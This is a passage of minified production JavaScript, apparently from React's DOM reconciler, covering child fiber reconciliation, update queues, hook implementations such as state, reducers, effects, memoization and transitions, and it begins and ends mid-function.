          return i === null ? c(e, t, `` + n, r) : null;
        if (typeof n == `object` && n) {
          switch (n.$$typeof) {
            case _:
              return n.key === i ? l(e, t, n, r) : null;
            case v:
              return n.key === i ? u(e, t, n, r) : null;
            case D:
              return ((n = Ta(n)), p(e, t, n, r));
          }
          if (ae(n) || re(n)) return i === null ? d(e, t, n, r, null) : null;
          if (typeof n.then == `function`) return p(e, t, ja(n), r);
          if (n.$$typeof === C) return p(e, t, na(e, n), r);
          Na(e, n);
        }
        return null;
      }
      function m(e, t, n, r, i) {
        if (
          (typeof r == `string` && r !== ``) ||
          typeof r == `number` ||
          typeof r == `bigint`
        )
          return ((e = e.get(n) || null), c(t, e, `` + r, i));
        if (typeof r == `object` && r) {
          switch (r.$$typeof) {
            case _:
              return (
                (e = e.get(r.key === null ? n : r.key) || null),
                l(t, e, r, i)
              );
            case v:
              return (
                (e = e.get(r.key === null ? n : r.key) || null),
                u(t, e, r, i)
              );
            case D:
              return ((r = Ta(r)), m(e, t, n, r, i));
          }
          if (ae(r) || re(r))
            return ((e = e.get(n) || null), d(t, e, r, i, null));
          if (typeof r.then == `function`) return m(e, t, n, ja(r), i);
          if (r.$$typeof === C) return m(e, t, n, na(t, r), i);
          Na(t, r);
        }
        return null;
      }
      function h(i, a, s, c) {
        for (
          var l = null, u = null, d = a, h = (a = 0), g = null;
          d !== null && h < s.length;
          h++
        ) {
          d.index > h ? ((g = d), (d = null)) : (g = d.sibling);
          var _ = p(i, d, s[h], c);
          if (_ === null) {
            d === null && (d = g);
            break;
          }
          (e && d && _.alternate === null && t(i, d),
            (a = o(_, a, h)),
            u === null ? (l = _) : (u.sibling = _),
            (u = _),
            (d = g));
        }
        if (h === s.length) return (n(i, d), L && ji(i, h), l);
        if (d === null) {
          for (; h < s.length; h++)
            ((d = f(i, s[h], c)),
              d !== null &&
                ((a = o(d, a, h)),
                u === null ? (l = d) : (u.sibling = d),
                (u = d)));
          return (L && ji(i, h), l);
        }
        for (d = r(d); h < s.length; h++)
          ((g = m(d, i, h, s[h], c)),
            g !== null &&
              (e &&
                g.alternate !== null &&
                d.delete(g.key === null ? h : g.key),
              (a = o(g, a, h)),
              u === null ? (l = g) : (u.sibling = g),
              (u = g)));
        return (
          e &&
            d.forEach(function (e) {
              return t(i, e);
            }),
          L && ji(i, h),
          l
        );
      }
      function g(a, s, c, l) {
        if (c == null) throw Error(i(151));
        for (
          var u = null, d = null, h = s, g = (s = 0), _ = null, v = c.next();
          h !== null && !v.done;
          g++, v = c.next()
        ) {
          h.index > g ? ((_ = h), (h = null)) : (_ = h.sibling);
          var y = p(a, h, v.value, l);
          if (y === null) {
            h === null && (h = _);
            break;
          }
          (e && h && y.alternate === null && t(a, h),
            (s = o(y, s, g)),
            d === null ? (u = y) : (d.sibling = y),
            (d = y),
            (h = _));
        }
        if (v.done) return (n(a, h), L && ji(a, g), u);
        if (h === null) {
          for (; !v.done; g++, v = c.next())
            ((v = f(a, v.value, l)),
              v !== null &&
                ((s = o(v, s, g)),
                d === null ? (u = v) : (d.sibling = v),
                (d = v)));
          return (L && ji(a, g), u);
        }
        for (h = r(h); !v.done; g++, v = c.next())
          ((v = m(h, a, g, v.value, l)),
            v !== null &&
              (e &&
                v.alternate !== null &&
                h.delete(v.key === null ? g : v.key),
              (s = o(v, s, g)),
              d === null ? (u = v) : (d.sibling = v),
              (d = v)));
        return (
          e &&
            h.forEach(function (e) {
              return t(a, e);
            }),
          L && ji(a, g),
          u
        );
      }
      function b(e, r, o, c) {
        if (
          (typeof o == `object` &&
            o &&
            o.type === y &&
            o.key === null &&
            (o = o.props.children),
          typeof o == `object` && o)
        ) {
          switch (o.$$typeof) {
            case _:
              a: {
                for (var l = o.key; r !== null; ) {
                  if (r.key === l) {
                    if (((l = o.type), l === y)) {
                      if (r.tag === 7) {
                        (n(e, r.sibling),
                          (c = a(r, o.props.children)),
                          (c.return = e),
                          (e = c));
                        break a;
                      }
                    } else if (
                      r.elementType === l ||
                      (typeof l == `object` &&
                        l &&
                        l.$$typeof === D &&
                        Ta(l) === r.type)
                    ) {
                      (n(e, r.sibling),
                        (c = a(r, o.props)),
                        Ma(c, o),
                        (c.return = e),
                        (e = c));
                      break a;
                    }
                    n(e, r);
                    break;
                  } else t(e, r);
                  r = r.sibling;
                }
                o.type === y
                  ? ((c = gi(o.props.children, e.mode, c, o.key)),
                    (c.return = e),
                    (e = c))
                  : ((c = hi(o.type, o.key, o.props, null, e.mode, c)),
                    Ma(c, o),
                    (c.return = e),
                    (e = c));
              }
              return s(e);
            case v:
              a: {
                for (l = o.key; r !== null; ) {
                  if (r.key === l)
                    if (
                      r.tag === 4 &&
                      r.stateNode.containerInfo === o.containerInfo &&
                      r.stateNode.implementation === o.implementation
                    ) {
                      (n(e, r.sibling),
                        (c = a(r, o.children || [])),
                        (c.return = e),
                        (e = c));
                      break a;
                    } else {
                      n(e, r);
                      break;
                    }
                  else t(e, r);
                  r = r.sibling;
                }
                ((c = yi(o, e.mode, c)), (c.return = e), (e = c));
              }
              return s(e);
            case D:
              return ((o = Ta(o)), b(e, r, o, c));
          }
          if (ae(o)) return h(e, r, o, c);
          if (re(o)) {
            if (((l = re(o)), typeof l != `function`)) throw Error(i(150));
            return ((o = l.call(o)), g(e, r, o, c));
          }
          if (typeof o.then == `function`) return b(e, r, ja(o), c);
          if (o.$$typeof === C) return b(e, r, na(e, o), c);
          Na(e, o);
        }
        return (typeof o == `string` && o !== ``) ||
          typeof o == `number` ||
          typeof o == `bigint`
          ? ((o = `` + o),
            r !== null && r.tag === 6
              ? (n(e, r.sibling), (c = a(r, o)), (c.return = e), (e = c))
              : (n(e, r), (c = _i(o, e.mode, c)), (c.return = e), (e = c)),
            s(e))
          : n(e, r);
      }
      return function (e, t, n, r) {
        try {
          Aa = 0;
          var i = b(e, t, n, r);
          return ((ka = null), i);
        } catch (t) {
          if (t === V || t === xa) throw t;
          var a = di(29, t, null, e.mode);
          return ((a.lanes = r), (a.return = e), a);
        }
      };
    }
    var Fa = Pa(!0),
      Ia = Pa(!1),
      La = !1;
    function Ra(e) {
      e.updateQueue = {
        baseState: e.memoizedState,
        firstBaseUpdate: null,
        lastBaseUpdate: null,
        shared: { pending: null, lanes: 0, hiddenCallbacks: null },
        callbacks: null,
      };
    }
    function za(e, t) {
      ((e = e.updateQueue),
        t.updateQueue === e &&
          (t.updateQueue = {
            baseState: e.baseState,
            firstBaseUpdate: e.firstBaseUpdate,
            lastBaseUpdate: e.lastBaseUpdate,
            shared: e.shared,
            callbacks: null,
          }));
    }
    function Ba(e) {
      return { lane: e, tag: 0, payload: null, callback: null, next: null };
    }
    function Va(e, t, n) {
      var r = e.updateQueue;
      if (r === null) return null;
      if (((r = r.shared), K & 2)) {
        var i = r.pending;
        return (
          i === null ? (t.next = t) : ((t.next = i.next), (i.next = t)),
          (r.pending = t),
          (t = ci(e)),
          si(e, null, n),
          t
        );
      }
      return (ii(e, r, t, n), ci(e));
    }
    function Ha(e, t, n) {
      if (((t = t.updateQueue), t !== null && ((t = t.shared), n & 4194048))) {
        var r = t.lanes;
        ((r &= e.pendingLanes), (n |= r), (t.lanes = n), it(e, n));
      }
    }
    function Ua(e, t) {
      var n = e.updateQueue,
        r = e.alternate;
      if (r !== null && ((r = r.updateQueue), n === r)) {
        var i = null,
          a = null;
        if (((n = n.firstBaseUpdate), n !== null)) {
          do {
            var o = {
              lane: n.lane,
              tag: n.tag,
              payload: n.payload,
              callback: null,
              next: null,
            };
            (a === null ? (i = a = o) : (a = a.next = o), (n = n.next));
          } while (n !== null);
          a === null ? (i = a = t) : (a = a.next = t);
        } else i = a = t;
        ((n = {
          baseState: r.baseState,
          firstBaseUpdate: i,
          lastBaseUpdate: a,
          shared: r.shared,
          callbacks: r.callbacks,
        }),
          (e.updateQueue = n));
        return;
      }
      ((e = n.lastBaseUpdate),
        e === null ? (n.firstBaseUpdate = t) : (e.next = t),
        (n.lastBaseUpdate = t));
    }
    var Wa = !1;
    function Ga() {
      if (Wa) {
        var e = fa;
        if (e !== null) throw e;
      }
    }
    function Ka(e, t, n, r) {
      Wa = !1;
      var i = e.updateQueue;
      La = !1;
      var a = i.firstBaseUpdate,
        o = i.lastBaseUpdate,
        s = i.shared.pending;
      if (s !== null) {
        i.shared.pending = null;
        var c = s,
          l = c.next;
        ((c.next = null), o === null ? (a = l) : (o.next = l), (o = c));
        var u = e.alternate;
        u !== null &&
          ((u = u.updateQueue),
          (s = u.lastBaseUpdate),
          s !== o &&
            (s === null ? (u.firstBaseUpdate = l) : (s.next = l),
            (u.lastBaseUpdate = c)));
      }
      if (a !== null) {
        var d = i.baseState;
        ((o = 0), (u = l = c = null), (s = a));
        do {
          var f = s.lane & -536870913,
            p = f !== s.lane;
          if (p ? (Y & f) === f : (r & f) === f) {
            (f !== 0 && f === da && (Wa = !0),
              u !== null &&
                (u = u.next =
                  {
                    lane: 0,
                    tag: s.tag,
                    payload: s.payload,
                    callback: null,
                    next: null,
                  }));
            a: {
              var m = e,
                g = s;
              f = t;
              var _ = n;
              switch (g.tag) {
                case 1:
                  if (((m = g.payload), typeof m == `function`)) {
                    d = m.call(_, d, f);
                    break a;
                  }
                  d = m;
                  break a;
                case 3:
                  m.flags = (m.flags & -65537) | 128;
                case 0:
                  if (
                    ((m = g.payload),
                    (f = typeof m == `function` ? m.call(_, d, f) : m),
                    f == null)
                  )
                    break a;
                  d = h({}, d, f);
                  break a;
                case 2:
                  La = !0;
              }
            }
            ((f = s.callback),
              f !== null &&
                ((e.flags |= 64),
                p && (e.flags |= 8192),
                (p = i.callbacks),
                p === null ? (i.callbacks = [f]) : p.push(f)));
          } else
            ((p = {
              lane: f,
              tag: s.tag,
              payload: s.payload,
              callback: s.callback,
              next: null,
            }),
              u === null ? ((l = u = p), (c = d)) : (u = u.next = p),
              (o |= f));
          if (((s = s.next), s === null)) {
            if (((s = i.shared.pending), s === null)) break;
            ((p = s),
              (s = p.next),
              (p.next = null),
              (i.lastBaseUpdate = p),
              (i.shared.pending = null));
          }
        } while (1);
        (u === null && (c = d),
          (i.baseState = c),
          (i.firstBaseUpdate = l),
          (i.lastBaseUpdate = u),
          a === null && (i.shared.lanes = 0),
          (Gl |= o),
          (e.lanes = o),
          (e.memoizedState = d));
      }
    }
    function qa(e, t) {
      if (typeof e != `function`) throw Error(i(191, e));
      e.call(t);
    }
    function Ja(e, t) {
      var n = e.callbacks;
      if (n !== null)
        for (e.callbacks = null, e = 0; e < n.length; e++) qa(n[e], t);
    }
    var Ya = le(null),
      Xa = le(0);
    function Za(e, t) {
      ((e = Ul), N(Xa, e), N(Ya, t), (Ul = e | t.baseLanes));
    }
    function Qa() {
      (N(Xa, Ul), N(Ya, Ya.current));
    }
    function $a() {
      ((Ul = Xa.current), M(Ya), M(Xa));
    }
    var eo = le(null),
      to = null;
    function no(e) {
      var t = e.alternate;
      (N(so, so.current & 1),
        N(eo, e),
        to === null &&
          (t === null || Ya.current !== null || t.memoizedState !== null) &&
          (to = e));
    }
    function ro(e) {
      (N(so, so.current), N(eo, e), to === null && (to = e));
    }
    function io(e) {
      e.tag === 22
        ? (N(so, so.current), N(eo, e), to === null && (to = e))
        : ao(e);
    }
    function ao() {
      (N(so, so.current), N(eo, eo.current));
    }
    function oo(e) {
      (M(eo), to === e && (to = null), M(so));
    }
    var so = le(0);
    function co(e) {
      for (var t = e; t !== null; ) {
        if (t.tag === 13) {
          var n = t.memoizedState;
          if (n !== null && ((n = n.dehydrated), n === null || af(n) || of(n)))
            return t;
        } else if (
          t.tag === 19 &&
          (t.memoizedProps.revealOrder === `forwards` ||
            t.memoizedProps.revealOrder === `backwards` ||
            t.memoizedProps.revealOrder === `unstable_legacy-backwards` ||
            t.memoizedProps.revealOrder === `together`)
        ) {
          if (t.flags & 128) return t;
        } else if (t.child !== null) {
          ((t.child.return = t), (t = t.child));
          continue;
        }
        if (t === e) break;
        for (; t.sibling === null; ) {
          if (t.return === null || t.return === e) return null;
          t = t.return;
        }
        ((t.sibling.return = t.return), (t = t.sibling));
      }
      return null;
    }
    var lo = 0,
      U = null,
      W = null,
      uo = null,
      fo = !1,
      po = !1,
      mo = !1,
      ho = 0,
      go = 0,
      _o = null,
      vo = 0;
    function yo() {
      throw Error(i(321));
    }
    function bo(e, t) {
      if (t === null) return !1;
      for (var n = 0; n < t.length && n < e.length; n++)
        if (!Tr(e[n], t[n])) return !1;
      return !0;
    }
    function xo(e, t, n, r, i, a) {
      return (
        (lo = a),
        (U = t),
        (t.memoizedState = null),
        (t.updateQueue = null),
        (t.lanes = 0),
        (A.H = e === null || e.memoizedState === null ? Rs : zs),
        (mo = !1),
        (a = n(r, i)),
        (mo = !1),
        po && (a = Co(t, n, r, i)),
        So(e),
        a
      );
    }
    function So(e) {
      A.H = Ls;
      var t = W !== null && W.next !== null;
      if (((lo = 0), (uo = W = U = null), (fo = !1), (go = 0), (_o = null), t))
        throw Error(i(300));
      e === null ||
        nc ||
        ((e = e.dependencies), e !== null && $i(e) && (nc = !0));
    }
    function Co(e, t, n, r) {
      U = e;
      var a = 0;
      do {
        if ((po && (_o = null), (go = 0), (po = !1), 25 <= a))
          throw Error(i(301));
        if (((a += 1), (uo = W = null), e.updateQueue != null)) {
          var o = e.updateQueue;
          ((o.lastEffect = null),
            (o.events = null),
            (o.stores = null),
            o.memoCache != null && (o.memoCache.index = 0));
        }
        ((A.H = Bs), (o = t(n, r)));
      } while (po);
      return o;
    }
    function wo() {
      var e = A.H,
        t = e.useState()[0];
      return (
        (t = typeof t.then == `function` ? jo(t) : t),
        (e = e.useState()[0]),
        (W === null ? null : W.memoizedState) !== e && (U.flags |= 1024),
        t
      );
    }
    function To() {
      var e = ho !== 0;
      return ((ho = 0), e);
    }
    function Eo(e, t, n) {
      ((t.updateQueue = e.updateQueue), (t.flags &= -2053), (e.lanes &= ~n));
    }
    function Do(e) {
      if (fo) {
        for (e = e.memoizedState; e !== null; ) {
          var t = e.queue;
          (t !== null && (t.pending = null), (e = e.next));
        }
        fo = !1;
      }
      ((lo = 0), (uo = W = U = null), (po = !1), (go = ho = 0), (_o = null));
    }
    function Oo() {
      var e = {
        memoizedState: null,
        baseState: null,
        baseQueue: null,
        queue: null,
        next: null,
      };
      return (
        uo === null ? (U.memoizedState = uo = e) : (uo = uo.next = e),
        uo
      );
    }
    function ko() {
      if (W === null) {
        var e = U.alternate;
        e = e === null ? null : e.memoizedState;
      } else e = W.next;
      var t = uo === null ? U.memoizedState : uo.next;
      if (t !== null) ((uo = t), (W = e));
      else {
        if (e === null)
          throw U.alternate === null ? Error(i(467)) : Error(i(310));
        ((W = e),
          (e = {
            memoizedState: W.memoizedState,
            baseState: W.baseState,
            baseQueue: W.baseQueue,
            queue: W.queue,
            next: null,
          }),
          uo === null ? (U.memoizedState = uo = e) : (uo = uo.next = e));
      }
      return uo;
    }
    function Ao() {
      return { lastEffect: null, events: null, stores: null, memoCache: null };
    }
    function jo(e) {
      var t = go;
      return (
        (go += 1),
        _o === null && (_o = []),
        (e = wa(_o, e, t)),
        (t = U),
        (uo === null ? t.memoizedState : uo.next) === null &&
          ((t = t.alternate),
          (A.H = t === null || t.memoizedState === null ? Rs : zs)),
        e
      );
    }
    function Mo(e) {
      if (typeof e == `object` && e) {
        if (typeof e.then == `function`) return jo(e);
        if (e.$$typeof === C) return ta(e);
      }
      throw Error(i(438, String(e)));
    }
    function No(e) {
      var t = null,
        n = U.updateQueue;
      if ((n !== null && (t = n.memoCache), t == null)) {
        var r = U.alternate;
        r !== null &&
          ((r = r.updateQueue),
          r !== null &&
            ((r = r.memoCache),
            r != null &&
              (t = {
                data: r.data.map(function (e) {
                  return e.slice();
                }),
                index: 0,
              })));
      }
      if (
        ((t ??= { data: [], index: 0 }),
        n === null && ((n = Ao()), (U.updateQueue = n)),
        (n.memoCache = t),
        (n = t.data[t.index]),
        n === void 0)
      )
        for (n = t.data[t.index] = Array(e), r = 0; r < e; r++) n[r] = ne;
      return (t.index++, n);
    }
    function Po(e, t) {
      return typeof t == `function` ? t(e) : t;
    }
    function Fo(e) {
      return Io(ko(), W, e);
    }
    function Io(e, t, n) {
      var r = e.queue;
      if (r === null) throw Error(i(311));
      r.lastRenderedReducer = n;
      var a = e.baseQueue,
        o = r.pending;
      if (o !== null) {
        if (a !== null) {
          var s = a.next;
          ((a.next = o.next), (o.next = s));
        }
        ((t.baseQueue = a = o), (r.pending = null));
      }
      if (((o = e.baseState), a === null)) e.memoizedState = o;
      else {
        t = a.next;
        var c = (s = null),
          l = null,
          u = t,
          d = !1;
        do {
          var f = u.lane & -536870913;
          if (f === u.lane ? (lo & f) === f : (Y & f) === f) {
            var p = u.revertLane;
            if (p === 0)
              (l !== null &&
                (l = l.next =
                  {
                    lane: 0,
                    revertLane: 0,
                    gesture: null,
                    action: u.action,
                    hasEagerState: u.hasEagerState,
                    eagerState: u.eagerState,
                    next: null,
                  }),
                f === da && (d = !0));
            else if ((lo & p) === p) {
              ((u = u.next), p === da && (d = !0));
              continue;
            } else
              ((f = {
                lane: 0,
                revertLane: u.revertLane,
                gesture: null,
                action: u.action,
                hasEagerState: u.hasEagerState,
                eagerState: u.eagerState,
                next: null,
              }),
                l === null ? ((c = l = f), (s = o)) : (l = l.next = f),
                (U.lanes |= p),
                (Gl |= p));
            ((f = u.action),
              mo && n(o, f),
              (o = u.hasEagerState ? u.eagerState : n(o, f)));
          } else
            ((p = {
              lane: f,
              revertLane: u.revertLane,
              gesture: u.gesture,
              action: u.action,
              hasEagerState: u.hasEagerState,
              eagerState: u.eagerState,
              next: null,
            }),
              l === null ? ((c = l = p), (s = o)) : (l = l.next = p),
              (U.lanes |= f),
              (Gl |= f));
          u = u.next;
        } while (u !== null && u !== t);
        if (
          (l === null ? (s = o) : (l.next = c),
          !Tr(o, e.memoizedState) && ((nc = !0), d && ((n = fa), n !== null)))
        )
          throw n;
        ((e.memoizedState = o),
          (e.baseState = s),
          (e.baseQueue = l),
          (r.lastRenderedState = o));
      }
      return (a === null && (r.lanes = 0), [e.memoizedState, r.dispatch]);
    }
    function Lo(e) {
      var t = ko(),
        n = t.queue;
      if (n === null) throw Error(i(311));
      n.lastRenderedReducer = e;
      var r = n.dispatch,
        a = n.pending,
        o = t.memoizedState;
      if (a !== null) {
        n.pending = null;
        var s = (a = a.next);
        do ((o = e(o, s.action)), (s = s.next));
        while (s !== a);
        (Tr(o, t.memoizedState) || (nc = !0),
          (t.memoizedState = o),
          t.baseQueue === null && (t.baseState = o),
          (n.lastRenderedState = o));
      }
      return [o, r];
    }
    function Ro(e, t, n) {
      var r = U,
        a = ko(),
        o = L;
      if (o) {
        if (n === void 0) throw Error(i(407));
        n = n();
      } else n = t();
      var s = !Tr((W || a).memoizedState, n);
      if (
        (s && ((a.memoizedState = n), (nc = !0)),
        (a = a.queue),
        ls(Vo.bind(null, r, a, e), [e]),
        a.getSnapshot !== t || s || (uo !== null && uo.memoizedState.tag & 1))
      ) {
        if (
          ((r.flags |= 2048),
          is(9, { destroy: void 0 }, Bo.bind(null, r, a, n, t), null),
          q === null)
        )
          throw Error(i(349));
        o || lo & 127 || zo(r, t, n);
      }
      return n;
    }
    function zo(e, t, n) {
      ((e.flags |= 16384),
        (e = { getSnapshot: t, value: n }),
        (t = U.updateQueue),
        t === null
          ? ((t = Ao()), (U.updateQueue = t), (t.stores = [e]))
          : ((n = t.stores), n === null ? (t.stores = [e]) : n.push(e)));
    }
    function Bo(e, t, n, r) {
      ((t.value = n), (t.getSnapshot = r), Ho(t) && Uo(e));
    }
    function Vo(e, t, n) {
      return n(function () {
        Ho(t) && Uo(e);
      });
    }
    function Ho(e) {
      var t = e.getSnapshot;
      e = e.value;
      try {
        var n = t();
        return !Tr(e, n);
      } catch {
        return !0;
      }
    }
    function Uo(e) {
      var t = oi(e, 2);
      t !== null && hu(t, e, 2);
    }
    function Wo(e) {
      var t = Oo();
      if (typeof e == `function`) {
        var n = e;
        if (((e = n()), mo)) {
          Ve(!0);
          try {
            n();
          } finally {
            Ve(!1);
          }
        }
      }
      return (
        (t.memoizedState = t.baseState = e),
        (t.queue = {
          pending: null,
          lanes: 0,
          dispatch: null,
          lastRenderedReducer: Po,
          lastRenderedState: e,
        }),
        t
      );
    }
    function Go(e, t, n, r) {
      return ((e.baseState = n), Io(e, W, typeof r == `function` ? r : Po));
    }
    function Ko(e, t, n, r, a) {
      if (Ps(e)) throw Error(i(485));
      if (((e = t.action), e !== null)) {
        var o = {
          payload: a,
          action: e,
          next: null,
          isTransition: !0,
          status: `pending`,
          value: null,
          reason: null,
          listeners: [],
          then: function (e) {
            o.listeners.push(e);
          },
        };
        (A.T === null ? (o.isTransition = !1) : n(!0),
          r(o),
          (n = t.pending),
          n === null
            ? ((o.next = t.pending = o), qo(t, o))
            : ((o.next = n.next), (t.pending = n.next = o)));
      }
    }
    function qo(e, t) {
      var n = t.action,
        r = t.payload,
        i = e.state;
      if (t.isTransition) {
        var a = A.T,
          o = {};
        A.T = o;
        try {
          var s = n(i, r),
            c = A.S;
          (c !== null && c(o, s), Jo(e, t, s));
        } catch (n) {
          Xo(e, t, n);
        } finally {
          (a !== null && o.types !== null && (a.types = o.types), (A.T = a));
        }
      } else
        try {
          ((a = n(i, r)), Jo(e, t, a));
        } catch (n) {
          Xo(e, t, n);
        }
    }
    function Jo(e, t, n) {
      typeof n == `object` && n && typeof n.then == `function`
        ? n.then(
            function (n) {
              Yo(e, t, n);
            },
            function (n) {
              return Xo(e, t, n);
            },
          )
        : Yo(e, t, n);
    }
    function Yo(e, t, n) {
      ((t.status = `fulfilled`),
        (t.value = n),
        Zo(t),
        (e.state = n),
        (t = e.pending),
        t !== null &&
          ((n = t.next),
          n === t
            ? (e.pending = null)
            : ((n = n.next), (t.next = n), qo(e, n))));
    }
    function Xo(e, t, n) {
      var r = e.pending;
      if (((e.pending = null), r !== null)) {
        r = r.next;
        do ((t.status = `rejected`), (t.reason = n), Zo(t), (t = t.next));
        while (t !== r);
      }
      e.action = null;
    }
    function Zo(e) {
      e = e.listeners;
      for (var t = 0; t < e.length; t++) (0, e[t])();
    }
    function Qo(e, t) {
      return t;
    }
    function $o(e, t) {
      if (L) {
        var n = q.formState;
        if (n !== null) {
          a: {
            var r = U;
            if (L) {
              if (I) {
                b: {
                  for (var i = I, a = Ri; i.nodeType !== 8; ) {
                    if (!a) {
                      i = null;
                      break b;
                    }
                    if (((i = cf(i.nextSibling)), i === null)) {
                      i = null;
                      break b;
                    }
                  }
                  ((a = i.data), (i = a === `F!` || a === `F` ? i : null));
                }
                if (i) {
                  ((I = cf(i.nextSibling)), (r = i.data === `F!`));
                  break a;
                }
              }
              Bi(r);
            }
            r = !1;
          }
          r && (t = n[0]);
        }
      }
      return (
        (n = Oo()),
        (n.memoizedState = n.baseState = t),
        (r = {
          pending: null,
          lanes: 0,
          dispatch: null,
          lastRenderedReducer: Qo,
          lastRenderedState: t,
        }),
        (n.queue = r),
        (n = js.bind(null, U, r)),
        (r.dispatch = n),
        (r = Wo(!1)),
        (a = Ns.bind(null, U, !1, r.queue)),
        (r = Oo()),
        (i = { state: t, dispatch: null, action: e, pending: null }),
        (r.queue = i),
        (n = Ko.bind(null, U, i, a, n)),
        (i.dispatch = n),
        (r.memoizedState = e),
        [t, n, !1]
      );
    }
    function es(e) {
      return ts(ko(), W, e);
    }
    function ts(e, t, n) {
      if (
        ((t = Io(e, t, Qo)[0]),
        (e = Fo(Po)[0]),
        typeof t == `object` && t && typeof t.then == `function`)
      )
        try {
          var r = jo(t);
        } catch (e) {
          throw e === V ? xa : e;
        }
      else r = t;
      t = ko();
      var i = t.queue,
        a = i.dispatch;
      return (
        n !== t.memoizedState &&
          ((U.flags |= 2048),
          is(9, { destroy: void 0 }, ns.bind(null, i, n), null)),
        [r, a, e]
      );
    }
    function ns(e, t) {
      e.action = t;
    }
    function rs(e) {
      var t = ko(),
        n = W;
      if (n !== null) return ts(t, n, e);
      (ko(), (t = t.memoizedState), (n = ko()));
      var r = n.queue.dispatch;
      return ((n.memoizedState = e), [t, r, !1]);
    }
    function is(e, t, n, r) {
      return (
        (e = { tag: e, create: n, deps: r, inst: t, next: null }),
        (t = U.updateQueue),
        t === null && ((t = Ao()), (U.updateQueue = t)),
        (n = t.lastEffect),
        n === null
          ? (t.lastEffect = e.next = e)
          : ((r = n.next), (n.next = e), (e.next = r), (t.lastEffect = e)),
        e
      );
    }
    function as() {
      return ko().memoizedState;
    }
    function os(e, t, n, r) {
      var i = Oo();
      ((U.flags |= e),
        (i.memoizedState = is(
          1 | t,
          { destroy: void 0 },
          n,
          r === void 0 ? null : r,
        )));
    }
    function ss(e, t, n, r) {
      var i = ko();
      r = r === void 0 ? null : r;
      var a = i.memoizedState.inst;
      W !== null && r !== null && bo(r, W.memoizedState.deps)
        ? (i.memoizedState = is(t, a, n, r))
        : ((U.flags |= e), (i.memoizedState = is(1 | t, a, n, r)));
    }
    function cs(e, t) {
      os(8390656, 8, e, t);
    }
    function ls(e, t) {
      ss(2048, 8, e, t);
    }
    function us(e) {
      U.flags |= 4;
      var t = U.updateQueue;
      if (t === null) ((t = Ao()), (U.updateQueue = t), (t.events = [e]));
      else {
        var n = t.events;
        n === null ? (t.events = [e]) : n.push(e);
      }
    }
    function ds(e) {
      var t = ko().memoizedState;
      return (
        us({ ref: t, nextImpl: e }),
        function () {
          if (K & 2) throw Error(i(440));
          return t.impl.apply(void 0, arguments);
        }
      );
    }
    function fs(e, t) {
      return ss(4, 2, e, t);
    }
    function ps(e, t) {
      return ss(4, 4, e, t);
    }
    function ms(e, t) {
      if (typeof t == `function`) {
        e = e();
        var n = t(e);
        return function () {
          typeof n == `function` ? n() : t(null);
        };
      }
      if (t != null)
        return (
          (e = e()),
          (t.current = e),
          function () {
            t.current = null;
          }
        );
    }
    function hs(e, t, n) {
      ((n = n == null ? null : n.concat([e])),
        ss(4, 4, ms.bind(null, t, e), n));
    }
    function gs() {}
    function _s(e, t) {
      var n = ko();
      t = t === void 0 ? null : t;
      var r = n.memoizedState;
      return t !== null && bo(t, r[1]) ? r[0] : ((n.memoizedState = [e, t]), e);
    }
    function vs(e, t) {
      var n = ko();
      t = t === void 0 ? null : t;
      var r = n.memoizedState;
      if (t !== null && bo(t, r[1])) return r[0];
      if (((r = e()), mo)) {
        Ve(!0);
        try {
          e();
        } finally {
          Ve(!1);
        }
      }
      return ((n.memoizedState = [r, t]), r);
    }
    function ys(e, t, n) {
      return n === void 0 || (lo & 1073741824 && !(Y & 261930))
        ? (e.memoizedState = t)
        : ((e.memoizedState = n), (e = mu()), (U.lanes |= e), (Gl |= e), n);
    }
    function bs(e, t, n, r) {
      return Tr(n, t)
        ? n
        : Ya.current === null
          ? !(lo & 42) || (lo & 1073741824 && !(Y & 261930))
            ? ((nc = !0), (e.memoizedState = n))
            : ((e = mu()), (U.lanes |= e), (Gl |= e), t)
          : ((e = ys(e, n, r)), Tr(e, t) || (nc = !0), e);
    }
    function xs(e, t, n, r, i) {
      var a = j.p;
      j.p = a !== 0 && 8 > a ? a : 8;
      var o = A.T,
        s = {};
      ((A.T = s), Ns(e, !1, t, n));
      try {
        var c = i(),
          l = A.S;
        (l !== null && l(s, c),
          typeof c == `object` && c && typeof c.then == `function`
            ? Ms(e, t, ha(c, r), pu(e))
            : Ms(e, t, r, pu(e)));
      } catch (n) {
        Ms(e, t, { then: function () {}, status: `rejected`, reason: n }, pu());
      } finally {
        ((j.p = a),
          o !== null && s.types !== null && (o.types = s.types),
          (A.T = o));
      }
    }
    function Ss() {}
    function Cs(e, t, n, r) {
      if (e.tag !== 5) throw Error(i(476));
      var a = ws(e).queue;
      xs(
        e,
        a,
        t,
        oe,
        n === null
          ? Ss
          : function () {
              return (Ts(e), n(r));
            },
      );
    }
    function ws(e) {
      var t = e.memoizedState;
      if (t !== null) return t;
      t = {
        memoizedState: oe,
        baseState: oe,
        baseQueue: null,
        queue: {
          pending: null,
          lanes: 0,
          dispatch: null,
          lastRenderedReducer: Po,
          lastRenderedState: oe,
        },
        next: null,
      };
      var n = {};
      return (
        (t.next = {
          memoizedState: n,
          baseState: n,
          baseQueue: null,
          queue: {
            pending: null,
            lanes: 0,
            dispatch: null,
            lastRenderedReducer: Po,
            lastRenderedState: n,
          },
          next: null,
        }),
        (e.memoizedState = t),
        (e = e.alternate),
        e !== null && (e.memoizedState = t),
        t
      );
    }
    function Ts(e) {
      var t = ws(e);
      (t.next === null && (t = e.alternate.memoizedState),
        Ms(e, t.next.queue, {}, pu()));
    }
    function Es() {
      return ta(Qf);
    }
    function Ds() {
      return ko().memoizedState;
    }
    function Os() {
      return ko().memoizedState;
    }
    function ks(e) {
      for (var t = e.return; t !== null; ) {
        switch (t.tag) {
          case 24:
          case 3:
            var n = pu();
            e = Ba(n);
            var r = Va(t, e, n);
            (r !== null && (hu(r, t, n), Ha(r, t, n)),
              (t = { cache: sa() }),
              (e.payload = t));
            return;
        }
        t = t.return;
      }
    }
    function As(e, t, n) {
      var r = pu();
      ((n = {
        lane: r,
        revertLane: 0,
        gesture: null,
        action: n,
        hasEagerState: !1,
        eagerState: null,
        next: null,
      }),
        Ps(e)
          ? Fs(t, n)
          : ((n = ai(e, t, n, r)), n !== null && (hu(n, e, r), Is(n, t, r))));
    }
    function js(e, t, n) {
      Ms(e, t, n, pu());
    }
    function Ms(e, t, n, r) {
      var i = {
        lane: r,
        revertLane: 0,
        gesture: null,
        action: n,
        hasEagerState: !1,
        eagerState: null,
        next: null,
      };
      if (Ps(e)) Fs(t, i);
      else {
        var a = e.alternate;
        if (
          e.lanes === 0 &&
          (a === null || a.lanes === 0) &&
          ((a = t.lastRenderedReducer), a !== null)
        )
          try {
